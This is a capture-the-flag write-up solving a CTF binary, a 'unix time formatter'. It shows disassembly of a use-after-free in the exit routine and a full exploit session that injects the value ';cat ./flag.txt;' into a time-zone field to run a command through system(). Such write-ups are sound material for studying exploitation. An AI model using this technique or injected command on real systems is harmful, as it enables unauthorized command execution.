### Solved by Swappage

unix time formatter is an ELF64 binary where our objective is gain a shell on the server.

    unix_time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped

The binary, when runs, provides us with a menu with 5 choices:

    Welcome to Mary's Unix Time Formatter!
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.

each invoking a different function.

Every option in this program is useful for the exploitation, except from the second one, that accepts as input the actual timestamp.

If we feed the application with normal input, without any bad behaviour, and print the time with the option 4, we can quickly notice that system() is invoked with the command:

    /bin/date -d @<timestamp> +'<format_string>'

A look in depth in the disassembler reveals, that in fact it invokes the command with

    /bin/date -d @%d +'%s'

This looks like a command injection, but since the timestamp is passed as %d, we can't inject anything in there, and the format string is sanitized.

but what about the timezone?

A more in depth analysis revealed that the function responsible for setting the format string, and the one responsible for the timezone (which is actually useless if not for exploitation purposes), make a good use of the *strdup()* function, allocating on the heap a memory region every time we define a new format string or time zone

    / (fcn) fcn.00400c26 88
    |          ; CALL XREF from 0x00400ddb (fcn.00400d74)
    |          0x00400c26    55             push rbp
    |          0x00400c27    53             push rbx
    |          0x00400c28    4889fd         mov rbp, rdi
    |          0x00400c2b    51             push rcx
    |          0x00400c2c    e82ffeffff     call sym.imp.strdup ;sym.imp.strdup(unk, unk, unk)
    |          0x00400c31    4885c0         test rax, rax
    |      ,=< 0x00400c34    7511           jne 0x400c47                  
    |      |   0x00400c36    beb4104000     mov esi, str.strdup            ; "strdup" @ 0x4010b4
    |      |   0x00400c3b    bf01000000     mov edi, 1
    |      |   0x00400c40    31c0           xor eax, eax
    |      |   0x00400c42    e8b9fdffff     call sym.imp.err ;sym.imp.err()
    |      |   ; JMP XREF from 0x00400c34 (fcn.00400c26)
    |      `-> 0x00400c47    bfbb104000     mov edi, str.DEBUG             ; "DEBUG" @ 0x4010bb
    |          0x00400c4c    4889c3         mov rbx, rax
    |          0x00400c4f    e8ccfcffff     call sym.imp.getenv ;sym.imp.getenv()
    |          0x00400c54    4885c0         test rax, rax
    |     ,==< 0x00400c57    741e           je 0x400c77                   
    |     |    0x00400c59    488b3da01420.  mov rdi, qword [rip + 0x2014a0]  ; [0x602100:8]=0x3531303220312e32  ; "2.1 20151010" @ 0x602100
    |     |    0x00400c60    4989d8         mov r8, rbx
    |     |    0x00400c63    4889e9         mov rcx, rbp
    |     |    0x00400c66    bac1104000     mov edx, str.strdup__p_____p_n ; "strdup(%p) = %p." @ 0x4010c1
    |     |    0x00400c6b    be01000000     mov esi, 1
    |     |    0x00400c70    31c0           xor eax, eax
    |     |    0x00400c72    e8d9fdffff     call sym.imp.__fprintf_chk ;sym.imp.__fprintf_chk()
    |     |    ; JMP XREF from 0x00400c57 (fcn.00400c26)
    |     `--> 0x00400c77    4889d8         mov rax, rbx
    |          0x00400c7a    5a             pop rdx
    |          0x00400c7b    5b             pop rbx
    |          0x00400c7c    5d             pop rbp
    \          0x00400c7d    c3             ret


if we look at it in the debugger we can see that memory is allocated like this

    0x603010:	0x00005925	0x00000000	0x00000000	0x00000000
    0x603020:	0x00000000	0x00000000	0x00000041	0x00000000
    0x603030:	0x41414141	0x41414141	0x41414141	0x41414141
    0x603040:	0x41414141	0x41414141	0x41414141	0x41414141

with the first parte being the format string, and the second one being the timezone, on which no check is performed

When the function responsible for invoking /bin/date is called the value of the format string is used; if we can trick the application to use the timezone buffer instead of the format string for running /bin/date, we can inhect arbitrary command.

This can be achieved thanks to a bug in the exit function.

    / (fcn) fcn.00400f8f 150
    |          0x00400f8f    4883ec28       sub rsp, 0x28
    |          0x00400f93    488b3d7e1120.  mov rdi, qword [rip + 0x20117e]  ; [0x602118:8]=0x707265746e692e  ; ".interp" @ 0x602118
    |          0x00400f9a    64488b042528.  mov rax, qword fs:[0x28]        ; [0x28:8]=0x21f8  ; '('
    |          0x00400fa3    4889442418     mov qword [rsp + 0x18], rax     ; [0x18:8]=0x400b30 entry0
    |          0x00400fa8    31c0           xor eax, eax
    |          0x00400faa    e8cffcffff     call fcn.00400c7e ;fcn.00400c7e() ; fcn.00400be0+158
    |          0x00400faf    488b3d5a1120.  mov rdi, qword [rip + 0x20115a]  ; [0x602110:8]=0x62617472747368  ; "hstrtab" @ 0x602110
    |          0x00400fb6    e8c3fcffff     call fcn.00400c7e ;fcn.00400c7e() ; fcn.00400be0+158
    |          0x00400fbb    be0a124000     mov esi, str.Are_you_sure_you_want_to_exit__y_N__ ; "Are you sure you want to exit (y/N)? " @ 0x40120a
    |          0x00400fc0    bf01000000     mov edi, 1
    |          0x00400fc5    31c0           xor eax, eax
    |          0x00400fc7    e864faffff     call sym.imp.__printf_chk ;sym.imp.__printf_chk()
    |          0x00400fcc    488b3d0d1120.  mov rdi, qword [rip + 0x20110d]  ; [0x6020e0:8]=0x625528203a434347  ; "GCC: (Ubuntu 5.2.1-22ubuntu2) 5.2.1 20151010" @ 0x6020e0
    |          0x00400fd3    e838faffff     call sym.imp.fflush ;sym.imp.fflush()
    |          0x00400fd8    488b15111120.  mov rdx, qword [rip + 0x201111]  ; [0x6020f0:8]=0x75627532322d312e  ; ".1-22ubuntu2) 5.2.1 20151010" @ 0x6020f0
    |          0x00400fdf    488d7c2408     lea rdi, qword [rsp + 8]        ; 0x8
    |          0x00400fe4    be10000000     mov esi, 0x10
    |          0x00400fe9    e8f2f9ffff     call sym.imp.fgets ;sym.imp.fgets()
    |          0x00400fee    8a542408       mov dl, byte [rsp + 8]          ; [0x8:1]=0
    |          0x00400ff2    31c0           xor eax, eax
    |          0x00400ff4    83e2df         and edx, 0xffffffdf
    |          0x00400ff7    80fa59         cmp dl, 0x59                   ; 'Y'
    |      ,=< 0x00400ffa    750f           jne 0x40100b                  
    |      |   0x00400ffc    bf30124000     mov edi, str.OK__exiting.      ; "OK, exiting." @ 0x401230
    |      |   0x00401001    e84af9ffff     call sym.imp.puts ;sym.imp.puts()
    |      |   0x00401006    b801000000     mov eax, 1
    |      |   ; JMP XREF from 0x00400ffa (fcn.00400f8f)
    |      `-> 0x0040100b    488b4c2418     mov rcx, qword [rsp + 0x18]     ; [0x18:8]=0x400b30 entry0
    |          0x00401010    6448330c2528.  xor rcx, qword fs:[0x28]
    |     ,==< 0x00401019    7405           je 0x401020                   
    |     |    0x0040101b    e850f9ffff     call sym.imp.__stack_chk_fail ;sym.imp.__stack_chk_fail()
    |     |    ; JMP XREF from 0x00401019 (fcn.00400f8f)
    |     `--> 0x00401020    4883c428       add rsp, 0x28
    \          0x00401024    c3             ret

as we can see the program invokes *fcn.00400c7e* and *fcn.00400c7e* right at the beginning, and then asks us for confirmation if we really want to exit.

these two function are responsible for freeing the allocated memory before exiting the application

    / (fcn) fcn.00400c7e 55
    |          ; CALL XREF from 0x00400e27 (fcn.00400e00)
    |          ; CALL XREF from 0x00400faa (fcn.00400f8f)
    |          ; CALL XREF from 0x00400fb6 (fcn.00400f8f)
    |          0x00400c7e    53             push rbx
    |          0x00400c7f    4889fb         mov rbx, rdi
    |          0x00400c82    bfbb104000     mov edi, str.DEBUG             ; "DEBUG" @ 0x4010bb
    |          0x00400c87    e894fcffff     call sym.imp.getenv ;sym.imp.getenv(unk)
    |          0x00400c8c    4885c0         test rax, rax
    |      ,=< 0x00400c8f    741b           je 0x400cac                   
    |      |   0x00400c91    488b3d681420.  mov rdi, qword [rip + 0x201468]  ; [0x602100:8]=0x3531303220312e32  ; "2.1 20151010" @ 0x602100
    |      |   0x00400c98    4889d9         mov rcx, rbx
    |      |   0x00400c9b    bad2104000     mov edx, str.free__p__n        ; "free(%p)." @ 0x4010d2
    |      |   0x00400ca0    be01000000     mov esi, 1
    |      |   0x00400ca5    31c0           xor eax, eax
    |      |   0x00400ca7    e8a4fdffff     call sym.imp.__fprintf_chk ;sym.imp.__fprintf_chk()
    |      |   ; JMP XREF from 0x00400c8f (fcn.00400c7e)
    |      `-> 0x00400cac    4889df         mov rdi, rbx
    |          0x00400caf    5b             pop rbx
    \          0x00400cb0    e98bfcffff     jmp sym.imp.free

meaning that if we pretend to quit the application and then don't confirm, the program will *free()* our previously allocated memory regions, resulting in a use after free vulnerability.

After the memory has been freed, if we create a new timezone element on the heap, it will be created at the same memory region where initially the format string was stored, resulting in a command injection.

here is the exploit in action:

    Welcome to Mary's Unix Time Formatter!
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 1
    Format: %Y
    Format set.
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 5
    Are you sure you want to exit (y/N)? N
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 2
    Enter your unix time: 1460853504.891168
    Time set.
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 3
    Time zone: ';cat ./flag.txt;'   
    Time zone set.
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 4
    Your formatted time is:
    PCTF{use_after_free_isnt_so_bad}
    sh: 1: : Permission denied
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
